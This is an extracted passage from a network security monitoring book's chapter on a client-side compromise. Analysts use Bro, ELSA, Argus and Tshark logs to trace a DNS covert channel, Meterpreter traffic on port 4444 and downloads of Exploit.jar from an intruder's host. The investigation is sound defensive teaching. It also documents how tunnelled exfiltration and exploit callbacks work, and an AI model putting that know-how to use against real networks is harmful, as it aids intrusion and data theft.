  type: TYPE_NORMAL
- en: probably due to system updates.
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **241**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 137](index-276_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '![Image 138](index-276_2.png)'
  prefs: []
  type: TYPE_IMG
- en: '*Figure 11-8: ELSA displays data sources for logs for 172.16.0.37\.*'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we look at the dstip information and get results, as shown in
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11-9\. (I’ve snipped the results to concentrate on the most pertinent
  prefs: []
  type: TYPE_NORMAL
- en: information.)
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-9: ELSA displays a summary of dstip entries for 172.16.0.37\.*'
  prefs: []
  type: TYPE_NORMAL
- en: One entry catches our attention. The bottom record shows 10.0.0.99, an
  prefs: []
  type: TYPE_NORMAL
- en: IP address in the Vivian’s Pets internal network. That means there were five
  prefs: []
  type: TYPE_NORMAL
- en: connections between 172.16.0.37 and 10.0.0.99\. Are these legitimate? Could
  prefs: []
  type: TYPE_NORMAL
- en: one or more be caused by an intruder abusing 172.16.0.37?
  prefs: []
  type: TYPE_NORMAL
- en: Clicking the IP address 10.0.0.99 tells ELSA to query for records where
  prefs: []
  type: TYPE_NORMAL
- en: 10.0.0.99 was the destination IP address and 172.16.0.37 was the source IP
  prefs: []
  type: TYPE_NORMAL
- en: address. Figure 11-10 shows the results.
  prefs: []
  type: TYPE_NORMAL
- en: These records show three SSH connections. All three appear in the
  prefs: []
  type: TYPE_NORMAL
- en: Bro *conn.log* file, and two appear as “heuristic detections” in the Bro *notice.log*
    file. These connections could involve transfers of data via a program like
  prefs: []
  type: TYPE_NORMAL
- en: Secure Copy (scp) or interactive logins using SSH. It’s probably worth look-
  prefs: []
  type: TYPE_NORMAL
- en: ing for all activity involving 10.0.0.9, so we run a new query (not shown)
  prefs: []
  type: TYPE_NORMAL
- en: '**242** Chapter 11'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 139](index-277_1.png)'
  prefs: []
  type: TYPE_IMG
- en: for only that IP address, and group the results by program. They show
  prefs: []
  type: TYPE_NORMAL
- en: 121 Snort alerts, 23 *conn.log* entries, 18 *dns.log* entries, 2 *notice.log*
    entries, and 1 *http.log* entry.
  prefs: []
  type: TYPE_NORMAL
- en: Using the same investigative steps, we query each of the log types for any-
  prefs: []
  type: TYPE_NORMAL
- en: thing interesting. All of the Snort alerts for 10.0.0.9 appear to be related
    to
  prefs: []
  type: TYPE_NORMAL
- en: package management, as do the Bro log entries for the rest of the activity.
  prefs: []
  type: TYPE_NORMAL
- en: Is that the end of the case? Was 172.16.0.37 the only victim, and the
  prefs: []
  type: TYPE_NORMAL
- en: SSH connections to 10.0.0.9 normal business activity? Could our NSM plat-
  prefs: []
  type: TYPE_NORMAL
- en: form have missed something?
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-10: ELSA displays Bro log records for source IP 172.16.0.37 and
    destination IP 10.0.0.9\.*'
  prefs: []
  type: TYPE_NORMAL
- en: '***Looking for Missing Traffic***'
  prefs: []
  type: TYPE_NORMAL
- en: At this point, we suspect that something may be wrong, and we want to
  prefs: []
  type: TYPE_NORMAL
- en: make sure that the NSM platform is performing as expected. Is our system
  prefs: []
  type: TYPE_NORMAL
- en: up to the task of watching two segments? Could it be dropping traffic?
  prefs: []
  type: TYPE_NORMAL
- en: One way to answer these questions is to check Bro’s *capture_loss.log*, which
  prefs: []
  type: TYPE_NORMAL
- en: reports on Bro’s packet-capture performance. Listing 11-1 shows the contents
  prefs: []
  type: TYPE_NORMAL
- en: of the log at the time of this incident.
  prefs: []
  type: TYPE_NORMAL
- en: $ **cat /nsm/bro/logs/current/capture_loss.log**
  prefs: []
  type: TYPE_NORMAL
- en: '#separator \x09'
  prefs: []
  type: TYPE_NORMAL
- en: '#set_separator ,'
  prefs: []
  type: TYPE_NORMAL
- en: '#empty_field (empty)'
  prefs: []
  type: TYPE_NORMAL
- en: '#unset_field -'
  prefs: []
  type: TYPE_NORMAL
- en: '#path capture_loss'
  prefs: []
  type: TYPE_NORMAL
- en: '#open 2013-03-16-15-02-50'
  prefs: []
  type: TYPE_NORMAL
- en: '#fields ts ts_delta peer gaps acks percent_lost'
  prefs: []
  type: TYPE_NORMAL
- en: '#types time interval string count count string'
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **243**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 1363446165.986403 900.000429 sovm-eth2-1 0 0 0.000%
  prefs: []
  type: TYPE_NORMAL
- en: 1363446165.992449 900.000470 sovm-eth1-1 0 0 0.000%
  prefs: []
  type: TYPE_NORMAL
- en: 1363447065.986807 900.000404 sovm-eth2-1 17963 19964 u89.977%
  prefs: []
  type: TYPE_NORMAL
- en: 1363447065.992765 900.000316 sovm-eth1-1 0 0 0.000%
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-1: Bro* capture_loss .log'
  prefs: []
  type: TYPE_NORMAL
- en: The second-to-last entry at u is shocking. It shows that Bro dropped
  prefs: []
  type: TYPE_NORMAL
- en: 89.977 percent of the traffic seen on the second sniffing sensor interface.
  prefs: []
  type: TYPE_NORMAL
- en: That could be devastating! (Bro may have run out of memory trying to
  prefs: []
  type: TYPE_NORMAL
- en: track a lot of network activity on an underpowered sensor.)
  prefs: []
  type: TYPE_NORMAL
- en: When monitoring a live interface, Bro must make decisions about which
  prefs: []
  type: TYPE_NORMAL
- en: traffic to inspect and which traffic to ignore, simply to try to keep pace with
  prefs: []
  type: TYPE_NORMAL
- en: the live packet stream. When run against a saved trace, Bro has more time
  prefs: []
  type: TYPE_NORMAL
- en: for processing packets, perhaps offering a more thorough analysis.
  prefs: []
  type: TYPE_NORMAL
- en: Remember that one of the tenets of NSM is to use multiple tools for
  prefs: []
  type: TYPE_NORMAL
- en: collection and analysis, so if one tool fails, different sources of data may
  prefs: []
  type: TYPE_NORMAL
- en: still help you determine what happened. Checking the */nsm/sensor_data/*
  prefs: []
  type: TYPE_NORMAL
- en: '*sovm-eth2/dailylogs/2013-03-16* directory on the NSM platform, we find the'
  prefs: []
  type: TYPE_NORMAL
- en: 163MB *snort.log.1363441680* file, which contains the full content data cap-
  prefs: []
  type: TYPE_NORMAL
- en: tured by Netsniff-ng on the SO NSM platform at the time of the incident.
  prefs: []
  type: TYPE_NORMAL
- en: Because we have a copy of the original traffic on disk, we can run tools
  prefs: []
  type: TYPE_NORMAL
- en: like Bro against it. Netsniff-ng was able to save the full trace because it
    was
  prefs: []
  type: TYPE_NORMAL
- en: just logging packets straight to disk; it wasn’t doing any inspection or analy-
  prefs: []
  type: TYPE_NORMAL
- en: sis, as Bro tried to do. To determine what Bro might have missed, we can
  prefs: []
  type: TYPE_NORMAL
- en: rerun Bro against the full content data stored on the sensor. The results are
  prefs: []
  type: TYPE_NORMAL
- en: shown in Listing 11-2\.
  prefs: []
  type: TYPE_NORMAL
- en: $ **bro -r snort.log.1363441680**
  prefs: []
  type: TYPE_NORMAL
- en: $ **ls -al**
  prefs: []
  type: TYPE_NORMAL
- en: total 203008
  prefs: []
  type: TYPE_NORMAL
- en: drwxrwxr-x 3 sovm sovm 4096 Mar 16 15:54 .
  prefs: []
  type: TYPE_NORMAL
- en: drwxr-xr-x 30 sovm sovm 4096 Mar 16 15:53 ..
  prefs: []
  type: TYPE_NORMAL
- en: -rw-rw-r-- 1 sovm sovm 59960 Mar 16 15:54 conn.log
  prefs: []
  type: TYPE_NORMAL
- en: -rw-rw-r-- 1 sovm sovm 44624347 Mar 16 15:54 dns.logu
  prefs: []
  type: TYPE_NORMAL
- en: -rw-rw-r-- 1 sovm sovm 1328 Mar 16 15:54 http.log
  prefs: []
  type: TYPE_NORMAL
- en: -rw-rw-r-- 1 sovm sovm 1446 Mar 16 15:54 notice.log
  prefs: []
  type: TYPE_NORMAL
- en: -rw-rw-r-- 1 sovm sovm 1128 Mar 16 15:54 notice_policy.log
  prefs: []
  type: TYPE_NORMAL
- en: -rw-rw-r-- 1 sovm sovm 251 Mar 16 15:54 packet_filter.log
  prefs: []
  type: TYPE_NORMAL
- en: -rw-r--r-- 1 sovm sovm 163155548 Mar 16 15:53 snort.log.1363441680
  prefs: []
  type: TYPE_NORMAL
- en: -rw-rw-r-- 1 sovm sovm 1066 Mar 16 15:54 ssh.log
  prefs: []
  type: TYPE_NORMAL
- en: drwx------ 3 sovm sovm 4096 Mar 16 15:54 .state
  prefs: []
  type: TYPE_NORMAL
- en: -rw-rw-r-- 1 sovm sovm 1668 Mar 16 15:54 weird.log
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-2: Running Bro manual y against full content data*'
  prefs: []
  type: TYPE_NORMAL
- en: The large size of the *dns.log* file at u attracts our attention immediately.
  prefs: []
  type: TYPE_NORMAL
- en: How is there a 44MB DNS log for a 163MB packet trace?
  prefs: []
  type: TYPE_NORMAL
- en: '**244** Chapter 11'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**analyzing the bro dns.log file**'
  prefs: []
  type: TYPE_NORMAL
- en: We decide to browse the new *dns.log* file manually to see what it reveals.
  prefs: []
  type: TYPE_NORMAL
- en: '**N o T e :** *In early 2013, ELSA author Martin Holste added an* import.pl
    *script* (https://'
  prefs: []
  type: TYPE_NORMAL
- en: code.google.com/p/enterprise-log-search-and-archive/source/browse/
  prefs: []
  type: TYPE_NORMAL
- en: trunk/elsa/node/import.pl/) *to ELSA to enable manual log additions. For this*
  prefs: []
  type: TYPE_NORMAL
- en: '*example, however, we will combine the earlier ELSA query method with manual
    log*'
  prefs: []
  type: TYPE_NORMAL
- en: '*review, to demonstrate how analysts can use both techniques.*'
  prefs: []
  type: TYPE_NORMAL
- en: We see many normal entries, and then a few that look odd. Listing 11-3
  prefs: []
  type: TYPE_NORMAL
- en: shows a few sample DNS log entries.
  prefs: []
  type: TYPE_NORMAL
- en: 1363444304.701350 fOBMXgho3v5 10.0.0.99 40912 198.51.100.3 53 udp 10453 daisy.ubuntu.comu
    1 C_INTERNET 1 Ay 0 NOERROR F
  prefs: []
  type: TYPE_NORMAL
- en: F T T 0 91.189.95.54,91.189.95.55{ 5.000000,5.000000
  prefs: []
  type: TYPE_NORMAL
- en: 1363444390.148462 Vr7iTah4er6 10.0.0.99| 58566 203.0.113.8} 53 udp 470 labhl2pekjmnzoaoteostk4ms4xfhzma.practicalnsm.comv
    1 C_INTERNET 10
  prefs: []
  type: TYPE_NORMAL
- en: NULLz - - F F T
  prefs: []
  type: TYPE_NORMAL
- en: F 0 - -
  prefs: []
  type: TYPE_NORMAL
- en: 1363444390.147170 Vr7iTah4er6 10.0.0.99| 58566 203.0.113.8} 53 udp 58279 vaaaakat2v2.practicalnsm.comw
    1 C_INTERNET 10 NULLz - -
  prefs: []
  type: TYPE_NORMAL
- en: F F T F 0 -
  prefs: []
  type: TYPE_NORMAL
- en: '-'
  prefs: []
  type: TYPE_NORMAL
- en: 1363444390.092180 Vr7iTah4er6 10.0.0.99| 58566 203.0.113.8} 53 udp 50552 yrb5fo.practicalnsm.comx
    1 C_INTERNET 10 NULLz - - F
  prefs: []
  type: TYPE_NORMAL
- en: F T F 0 - -
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-3: Normal and suspicious entries in the Bro* dns .log *file*'
  prefs: []
  type: TYPE_NORMAL
- en: The first record for *daisy.ubuntu.com* u looks like a regular DNS query;
  prefs: []
  type: TYPE_NORMAL
- en: someone wants to know the IP address for this site. But the second two records
  prefs: []
  type: TYPE_NORMAL
- en: look odd. Why is someone querying for *labhl2pekjmnzoaoteostk4ms4xfhzma*
  prefs: []
  type: TYPE_NORMAL
- en: '*.practicalnsm.com* v, *vaaaakat2v2.practicalnsm.com* w, and *yrb5fo.practicalnsm*'
  prefs: []
  type: TYPE_NORMAL
- en: '*.com* x? Also, unlike the first query for an A record y, these are NULL que-'
  prefs: []
  type: TYPE_NORMAL
- en: ries z, which serve no practical purpose. A query for an A record returns
  prefs: []
  type: TYPE_NORMAL
- en: the IP address associated with a domain name. Bro logs the response to the
  prefs: []
  type: TYPE_NORMAL
- en: A record query in the single DNS log {.
  prefs: []
  type: TYPE_NORMAL
- en: 'Also note the source and destination IP addresses for these queries:'
  prefs: []
  type: TYPE_NORMAL
- en: 10.0.0.99 | and 203.0.113.8 }. The source IP address 10.0.0.99 was the sys-
  prefs: []
  type: TYPE_NORMAL
- en: tem to which 172.16.0.37 connected three times via SSH. The destination IP
  prefs: []
  type: TYPE_NORMAL
- en: address shares the same net block as 203.0.113.15, the computer hosting a
  prefs: []
  type: TYPE_NORMAL
- en: malicious Java payload. Something odd is happening here. Then we notice
  prefs: []
  type: TYPE_NORMAL
- en: other weird entries that also involve 10.0.0.99 and 203.0.113.8, as shown in
  prefs: []
  type: TYPE_NORMAL
- en: Listing 11-4\. These are NULL DNS records as well u.
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **245**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 1363445036.498672 FVaYW5ltbNh 10.0.0.99 34482 203.0.113.8 53 udp 49394 0euase6eq\xc5v\xc1\xbfp2\xc5h\xdd\xd0kmv\xedt\xc2\xc7\xf8\xea2p\xdc\xe0\xcd\xef\xfd\
    xc5t\xed8t\xc4yj\xd1\xdf9qn\xf8\xcf0\xd8\xd480\xe7\xc5\xda\xf97\xe5k.\xebb6\xd3gj\xc76\xdb\xe9\
    xdbn\xce\xf1lv\xeb\xbdo\xdayn5gko\xc3tny9\xbf\xe5\xee\xce\xd3\xfb\xee\xc2bd\xd9zj\xbe\xe2z\
    xf37\xbe\xcf\xbeh\xfd\xea\xfbe.\xecch\xd4k\xc2cgjqq\xf2\xe5\xd1mj\xcck6mg\xf5z\xc5\xe7sc\xeb\
    xea\xfbsc\xe4\xeb\xf9\xe7xq\xd57\xd9t\xe3\xe3\xef\xc0m\xd7fh\xeav\xcc8dgs.r\xfd\xe9\xf8\xca\
    xd3\xe9\xc4\xd4u\xect8z\xcc\xf2w\xecyy\xc3\xf7n5bq\xf9\xe1v\xc1e\xcdo\xc8z\xf53\xcecgpwy\xd7\
    xfdr\xe5\xfae9iy\xe9\xebz7.practicalnsm.com 1
  prefs: []
  type: TYPE_NORMAL
- en: C_INTERNET 10 NULLu - - F F T F 0
  prefs: []
  type: TYPE_NORMAL
- en: '- -'
  prefs: []
  type: TYPE_NORMAL
- en: 1363444959.826628 FVaYW5ltbNh 10.0.0.99 34482 203.0.113.8 53 udp 53252 0iiafy\xf7\xdf\xdbw\xfa\xe3\xe1w\xe7u5\xd5auz\xbf\xe3\xd6\xe6\xd0\xf4u\xc0a\xe4\
    xc3l\xdf\xe6\xe1\xf6\xe1\xe1\xbf\xf62c\xd6\xe6d\xe8\xcf\xe2m\xc4\xe3\xe8\xeeru\xe68\xcd\
    xc8\xf4j.\xea\xf9ujb\xdau\xc0\xda\xf3\xef\xeb\xc5\xf9\xc4p\xbe\xee\xf6\xc1awd\xfc\xf2\xc5\
    xd0\xfd\xf1\xc0f\xc5r\xe0\xc9\xecm\xdd\xd2\xe2l\xf0\xd8\xfc\xd8ct5\xc6\xfdt\xcce\xec\xf7z\
    xea.z\xe5m\xfbr\xe9\xbe\xd2\xe7\xfd\xe3\xc6cu\xc2wtz\xeb\xe1uqk\xbf\xf2\xcb4\xe6v1w\xcei\xd8\
    xca\xc8hmsg4qjzhkd\xe0u\xe4\xfa\xc7nitlk.\xbc\xeb\xdec\xe1\xc8l31yiz\xfd\xd1\xf8\xfdro\xd0\
    xef3p\xccoql\xd9\xdb\xc5\xedt\xc2\xc1\xd5\xf2m\xfcq\xebm\xc2\xc8f\xf9x\xf8xikc\xc3wu\xdfcc.
  prefs: []
  type: TYPE_NORMAL
- en: practicalnsm.com 1 C_INTERNET 10 NULLu - - F F T
  prefs: []
  type: TYPE_NORMAL
- en: F 0 - -
  prefs: []
  type: TYPE_NORMAL
- en: 1363445003.696798 FVaYW5ltbNh 10.0.0.99 34482 203.0.113.8 53 udp 45003 0akazvdidx3\xf1bv\xf078w\xe20\xfd\xd0i\xc1\xe7d\xe2\xc5\xcd\xe3\xda7\xe0\xf9\xbf9\
    xfdk\xefrxcn\xd5\xebue\xc6\xed\xbc\xc5b\xe2\xcc\xda\xd0\xc3\xe2\xbdij8.\xdf\xf3\xfa\xefy\xfd\
    xc8yhm\xbe\xf77l\xc8\xdc\xe3\xe0\xca\xdeo\xc0\xf3\xcbam\xd1\xd2\xfdt\xd1i\xd7r\xea\xcbc3\xdc\
    xee\xe5\xe04o\xd9\xce\xec8n\xf99w\xd8\xfcjnw.\xf2j\xe4\xf5\xf6\xeb\xc60\xf3hv\xf9\xc38s\xef\
    xd5b\xe4\xc6\xc9\xc9g\xd38\xfbhy\xf5\xccxw\xc7\xd0a2ypsz\xca\xe3\xbd\xc8\xbd\xc6cy\xd2\xce\
    xbf\xe0b\xd8\xc4\xc6i.cb1\xf4fqp\xce\xd4\xebb\xe9v\xfdk\xed\xc3\xce\xcf\xe5j\xf9u\xf4uyn\
    xed\xe3o\xf6l\xd7zyrp\xf2\xfd5swrz\xe8\xe6\xd5\xe2\xd3iv\xf2m\xd2\xe9\xdb.practicalnsm.com
    1 C_INTERNET 10 NULLu - - F F T F 0
  prefs: []
  type: TYPE_NORMAL
- en: '- -'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-4: Malicious entries in the Bro* dns .log *file*'
  prefs: []
  type: TYPE_NORMAL
- en: It looks as if someone is transporting data within hostnames in the
  prefs: []
  type: TYPE_NORMAL
- en: '*practicalnsm.com* domain. This appears to be a form of covert channel—an'
  prefs: []
  type: TYPE_NORMAL
- en: intruder is sending content via DNS records.
  prefs: []
  type: TYPE_NORMAL
- en: The technique we’re observing is popular when defenders keep tight
  prefs: []
  type: TYPE_NORMAL
- en: access controls on outbound traffic. If an attacker can query name servers,
  prefs: []
  type: TYPE_NORMAL
- en: he can send data packaged as part of the hostnames he queries via DNS.
  prefs: []
  type: TYPE_NORMAL
- en: (This is a low-bandwidth attack method because a limited number of bytes
  prefs: []
  type: TYPE_NORMAL
- en: can be carried in a hostname. In fact, more than 65,000 DNS records in
  prefs: []
  type: TYPE_NORMAL
- en: this particular Bro *dns.log* file are associated with this sort of activity.)
  prefs: []
  type: TYPE_NORMAL
- en: '**checking destination Ports**'
  prefs: []
  type: TYPE_NORMAL
- en: So far, we’ve recognized that four IP addresses are involved in this particular
  prefs: []
  type: TYPE_NORMAL
- en: 'intrusion. Two belong to Vivian’s Pets: 172.16.0.37 (in the wireless network),'
  prefs: []
  type: TYPE_NORMAL
- en: and 10.0.0.99 (in the internal network). Two belong to the intruder and sit
  prefs: []
  type: TYPE_NORMAL
- en: 'on the Internet: 203.0.113.15 and 203.0.113.8\. Figure 11-11 shows the posi-'
  prefs: []
  type: TYPE_NORMAL
- en: tions of these IP addresses on the network.
  prefs: []
  type: TYPE_NORMAL
- en: '**246** Chapter 11'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 140](index-281_1.png)'
  prefs: []
  type: TYPE_IMG
- en: Intruder 1
  prefs: []
  type: TYPE_NORMAL
- en: Internet
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.15
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 2
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.8
  prefs: []
  type: TYPE_NORMAL
- en: Tap
  prefs: []
  type: TYPE_NORMAL
- en: Wireless
  prefs: []
  type: TYPE_NORMAL
- en: Network
  prefs: []
  type: TYPE_NORMAL
- en: Tap
  prefs: []
  type: TYPE_NORMAL
- en: NSM
  prefs: []
  type: TYPE_NORMAL
- en: Laptop
  prefs: []
  type: TYPE_NORMAL
- en: Internal
  prefs: []
  type: TYPE_NORMAL
- en: 172.16.0.37
  prefs: []
  type: TYPE_NORMAL
- en: Network
  prefs: []
  type: TYPE_NORMAL
- en: Desktop
  prefs: []
  type: TYPE_NORMAL
- en: 10.0.0.99
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-11: Participants in the intrusion*'
  prefs: []
  type: TYPE_NORMAL
- en: We decide to take another look at traffic involving 203.0.113.115, this
  prefs: []
  type: TYPE_NORMAL
- en: time by querying ELSA for records and group by dstport (destination port).
  prefs: []
  type: TYPE_NORMAL
- en: The results are shown in Figure 11-12\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-12: ELSA displays a summary*'
  prefs: []
  type: TYPE_NORMAL
- en: '*of dstport entries for 203.0.113.15\.*'
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **247**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 141](index-282_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '![Image 142](index-282_2.png)'
  prefs: []
  type: TYPE_IMG
- en: Records with 54056 as the destination port are associated with the
  prefs: []
  type: TYPE_NORMAL
- en: Metasploit Meterpreter activity noted earlier. There is only one type of mes-
  prefs: []
  type: TYPE_NORMAL
- en: sage for this activity; they are all Snort alerts, as shown in Figure 11-13\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-13: ELSA displays a summary of Snort signatures for*'
  prefs: []
  type: TYPE_NORMAL
- en: '*203.0.113.15 and dstport 54056\.*'
  prefs: []
  type: TYPE_NORMAL
- en: Turning to destination port 4444, we use a similar process with similar
  prefs: []
  type: TYPE_NORMAL
- en: results. Figure 11-14 shows what ELSA returns when we examine records
  prefs: []
  type: TYPE_NORMAL
- en: where port 4444 is the destination port and 203.0.113.15 is an IP address.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-14: ELSA displays a summary of Snort signatures for*'
  prefs: []
  type: TYPE_NORMAL
- en: '*203.0.113.15 and dstport 4444\.*'
  prefs: []
  type: TYPE_NORMAL
- en: It’s important to realize that these two destination ports are actually
  prefs: []
  type: TYPE_NORMAL
- en: artifacts of packets being exchanged between the computers at 203.0.113.15
  prefs: []
  type: TYPE_NORMAL
- en: and 172.16.0.37\. It may be difficult to recognize this because ELSA is sum-
  prefs: []
  type: TYPE_NORMAL
- en: marizing information captured in Snort alerts and other formats. However,
  prefs: []
  type: TYPE_NORMAL
- en: a quick check of the Argus session data makes it easy to understand this
  prefs: []
  type: TYPE_NORMAL
- en: important connection, as shown in Listing 11-5\.
  prefs: []
  type: TYPE_NORMAL
- en: $ **racluster -n -r /nsm/sensor_data/sovm-eth1/argus/2013-03-16.log - host 203.0.113.15**
  prefs: []
  type: TYPE_NORMAL
- en: StartTime Flgs Proto SrcAddr Sport Dir DstAddr Dport
  prefs: []
  type: TYPE_NORMAL
- en: TotPkts TotBytes State
  prefs: []
  type: TYPE_NORMAL
- en: 14:16:48.724146 e tcp 172.16.0.37.60320 -> 203.0.113.15.8080u 19 3360 FIN
  prefs: []
  type: TYPE_NORMAL
- en: 14:16:52.544555 e tcp 172.16.0.37.60321 -> 203.0.113.15.8080v 13 1790 FIN
  prefs: []
  type: TYPE_NORMAL
- en: 14:16:52.735852 e tcp 172.16.0.37.60322 -> 203.0.113.15.8080w 27 16164 FIN
  prefs: []
  type: TYPE_NORMAL
- en: 14:16:53.371660 e tcp 172.16.0.37.54056 -> 203.0.113.15.4444x 2802 834486 FIN
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-5: Argus records for sessions involving 203.0.113.15*'
  prefs: []
  type: TYPE_NORMAL
- en: '**248** Chapter 11'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: This record shows that 172.16.0.37 connected to 203.0.113.15 four times, as
    shown in the four sessions. The first three sessions connected to port 8080
  prefs: []
  type: TYPE_NORMAL
- en: TCP at u, v, and w. The last session connected to port 4444 TCP x.
  prefs: []
  type: TYPE_NORMAL
- en: We can examine these conversations via the full content data as well,
  prefs: []
  type: TYPE_NORMAL
- en: and use Tshark to pay attention to the HTTP traffic to port 8080 TCP.
  prefs: []
  type: TYPE_NORMAL
- en: Listing 11-6 shows that activity.
  prefs: []
  type: TYPE_NORMAL
- en: $ **tshark -t ad -n -r /nsm/sensor_data/sovm-eth1/dailylogs/2013-03-16/snort**
  prefs: []
  type: TYPE_NORMAL
- en: '**.log.1363441666 -R ''tcp.port==8080 and http''**'
  prefs: []
  type: TYPE_NORMAL
- en: 2910 2013-03-16 14:16:48.727696 172.16.0.37 -> 203.0.113.15 HTTP 373
  prefs: []
  type: TYPE_NORMAL
- en: GET /healthcarenews HTTP/1.1
  prefs: []
  type: TYPE_NORMAL
- en: 2912 2013-03-16 14:16:48.729359 203.0.113.15 -> 172.16.0.37 HTTP 200
  prefs: []
  type: TYPE_NORMAL
- en: HTTP/1.1 302 Moved
  prefs: []
  type: TYPE_NORMAL
- en: 2914 2013-03-16 14:16:48.746910 172.16.0.37 -> 203.0.113.15 HTTP 374
  prefs: []
  type: TYPE_NORMAL
- en: GET /healthcarenews/ HTTP/1.1
  prefs: []
  type: TYPE_NORMAL
- en: 2915 2013-03-16 14:16:48.752649 203.0.113.15 -> 172.16.0.37 HTTP 291
  prefs: []
  type: TYPE_NORMAL
- en: HTTP/1.1 200 OK (text/html)
  prefs: []
  type: TYPE_NORMAL
- en: 2917 2013-03-16 14:16:48.897487 172.16.0.37 -> 203.0.113.15 HTTP 340
  prefs: []
  type: TYPE_NORMAL
- en: GET /favicon.ico HTTP/1.1
  prefs: []
  type: TYPE_NORMAL
- en: 2918 2013-03-16 14:16:48.899164 203.0.113.15 -> 172.16.0.37 HTTP 335
  prefs: []
  type: TYPE_NORMAL
- en: HTTP/1.1 404 File not found (text/html)
  prefs: []
  type: TYPE_NORMAL
- en: 2920 2013-03-16 14:16:48.905587 172.16.0.37 -> 203.0.113.15 HTTP 370
  prefs: []
  type: TYPE_NORMAL
- en: GET /favicon.ico HTTP/1.1
  prefs: []
  type: TYPE_NORMAL
- en: 2921 2013-03-16 14:16:48.908271 203.0.113.15 -> 172.16.0.37 HTTP 335
  prefs: []
  type: TYPE_NORMAL
- en: HTTP/1.1 404 File not found (text/html)
  prefs: []
  type: TYPE_NORMAL
- en: 2926 2013-03-16 14:16:52.560069 172.16.0.37 -> 203.0.113.15 HTTP 415
  prefs: []
  type: TYPE_NORMAL
- en: GET /healthcarenews/Exploit.jar.pack.gzu HTTP/1.1
  prefs: []
  type: TYPE_NORMAL
- en: 2928 2013-03-16 14:16:52.719387 203.0.113.15 -> 172.16.0.37 HTTP 200
  prefs: []
  type: TYPE_NORMAL
- en: HTTP/1.1 302 Moved
  prefs: []
  type: TYPE_NORMAL
- en: 2930 2013-03-16 14:16:52.722747 172.16.0.37 -> 203.0.113.15 HTTP 274
  prefs: []
  type: TYPE_NORMAL
- en: GET /healthcarenews/ HTTP/1.1
  prefs: []
  type: TYPE_NORMAL
- en: 2932 2013-03-16 14:16:52.725372 203.0.113.15 -> 172.16.0.37 HTTP 291
  prefs: []
  type: TYPE_NORMAL
- en: HTTP/1.1 200 OKx (text/html)
  prefs: []
  type: TYPE_NORMAL
- en: 2939 2013-03-16 14:16:52.738151 172.16.0.37 -> 203.0.113.15 HTTP 364
  prefs: []
  type: TYPE_NORMAL
- en: GET /healthcarenews/Exploit.jarv HTTP/1.1
  prefs: []
  type: TYPE_NORMAL
- en: 2945 2013-03-16 14:16:53.022853 203.0.113.15 -> 172.16.0.37 HTTP 1138
  prefs: []
  type: TYPE_NORMAL
- en: HTTP/1.1 200 OKy (application/octet-stream)
  prefs: []
  type: TYPE_NORMAL
- en: 2951 2013-03-16 14:16:53.037218 172.16.0.37 -> 203.0.113.15 HTTP 406
  prefs: []
  type: TYPE_NORMAL
- en: GET /healthcarenews/Exploit.jarw HTTP/1.1
  prefs: []
  type: TYPE_NORMAL
- en: 2957 2013-03-16 14:16:53.056665 203.0.113.15 -> 172.16.0.37 HTTP 1138
  prefs: []
  type: TYPE_NORMAL
- en: HTTP/1.1 200 OKz (application/octet-stream)
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-6: HTTP traffic from 172.16.0.37 to 203.0.113.15*'
  prefs: []
  type: TYPE_NORMAL
- en: Listing 11-6 contains several troublesome entries. Requests for *Exploit*
  prefs: []
  type: TYPE_NORMAL
- en: '*.jar .pack.gz* at u and *Exploit.jar* v w indicate the intruder’s code on
    the victim system is trying to retrieve additional software from the attacking
    system. The'
  prefs: []
  type: TYPE_NORMAL
- en: initial code running on the victim is a beachhead, and now it’s calling back
  prefs: []
  type: TYPE_NORMAL
- en: home for reinforcements. Unfortunately for the victim, those packages are
  prefs: []
  type: TYPE_NORMAL
- en: available and served upon order, as shown by the 200 OK responses x y z.
  prefs: []
  type: TYPE_NORMAL
- en: This is another way to view activity that started the intrusion. However,
  prefs: []
  type: TYPE_NORMAL
- en: we still need to know what happened after the attack succeeded.
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **249**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
